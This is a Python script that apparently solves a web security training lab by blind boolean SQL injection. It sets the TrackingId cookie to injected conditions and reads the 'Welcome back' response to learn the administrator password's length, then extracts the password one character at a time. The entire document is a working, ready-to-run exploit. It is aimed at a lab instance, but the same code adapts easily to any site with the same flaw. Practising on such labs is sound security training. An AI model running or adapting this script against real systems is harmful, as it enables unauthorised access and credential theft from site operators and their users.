import requests
import string

# Fill this in from your lab instance
LAB_URL = "https://0a3500ab031f406a80e27b2300ec0016.web-security-academy.net/filter?category=Gifts"


session = requests.Session()

# Step 1: hit the page once to get your real, valid TrackingId cookie
session.get(LAB_URL)
real_tracking_id = session.cookies.get("TrackingId")
print("Got real TrackingId:", real_tracking_id)

def is_true(condition: str) -> bool:
    payload = f"{real_tracking_id}' AND {condition}--"
    session.cookies.set("TrackingId", payload)
    resp = session.get(LAB_URL)
    return "Welcome back" in resp.text

# Sanity check — should now be True / False correctly
print("Sanity check (should be True):", is_true("1=1"))
print("Sanity check (should be False):", is_true("1=2"))

# Find password length
length = 0
for i in range(1, 50):
    if is_true(f"LENGTH((SELECT password FROM users WHERE username='administrator'))={i}"):
        length = i
        print(f"Password length: {length}")
        break

# Extract password
password = ""
charset = string.ascii_lowercase + string.digits  # lab hint says lowercase alphanumeric
for position in range(1, length + 1):
    for char in charset:
        condition = f"SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}'"
        if is_true(condition):
            password += char
            print(f"Progress: {password}")
            break

print("Final password:", password)